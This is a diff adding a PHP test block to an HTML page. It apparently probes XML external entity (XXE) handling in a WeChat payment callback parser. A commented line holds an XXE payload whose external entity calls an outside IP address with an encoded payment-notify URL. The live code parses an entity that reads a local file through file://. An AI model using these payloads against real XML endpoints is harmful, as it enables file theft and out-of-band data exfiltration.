@@ -1,3 +1,51 @@
+<?php
+function normalize($obj)
+{
+    $result = null;
+
+    if (is_object($obj)) {
+        $obj = (array) $obj;
+    }
+
+    if (is_array($obj)) {
+        foreach ($obj as $key => $value) {
+            $res = normalize($value);
+            if (('@attributes' === $key) && ($key)) {
+                $result = $res;
+            } else {
+                $result[$key] = $res;
+            }
+        }
+    } else {
+        $result = $obj;
+    }
+
+    return $result;
+}
+
+//$xml = '<?xml version="1.0" encoding="utf-8" standalone="no" ?/>\n<!DOCTYPE root [\n<!ENTITY % xxe SYSTEM "http://183.61.52.240/wx_xxe_dbc_0113?aHR0cHM6Ly9zaG9wLmxpYW9nb3UxNjguY29tL3BheS93ZWNoYXQvYXBwL25vdGlmeQ==">\n%xxe;\n]><foo><value>\n%xxe;\n</value></foo>';
+//$xml = request('xml', '');//file_get_contents('C:\Users\11247\Desktop\phpunit2.xml');
+$xml=<<<EOF
+<?xml version="1.0" ?>
+<!DOCTYPE ANY[
+        <!ENTITY xxe SYSTEM "file:///C:/User/11247/Desktop/test2.html">
+]>
+<x>&xxe;</x>
+EOF;
+$data = simplexml_load_string($xml);
+print_r($data);
+//return;
+//if (!empty($xml)) {
+//    dump($xml);
+//    //$backup = libxml_disable_entity_loader(true);
+//    //$result = simplexml_load_string(html_entity_decode($xml), 'SimpleXMLElement', LIBXML_NOCDATA);//LIBXML_COMPACT | LIBXML_NOCDATA | LIBXML_NOBLANKS
+//    $result = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_COMPACT | LIBXML_NOCDATA | LIBXML_NOBLANKS);
+//    //$result = normalize($result);
+//    dump($result);
+//    //libxml_disable_entity_loader($backup);
+//}
+
+?>
 <html>
     <head>
         <meta charset="utf-8"/>
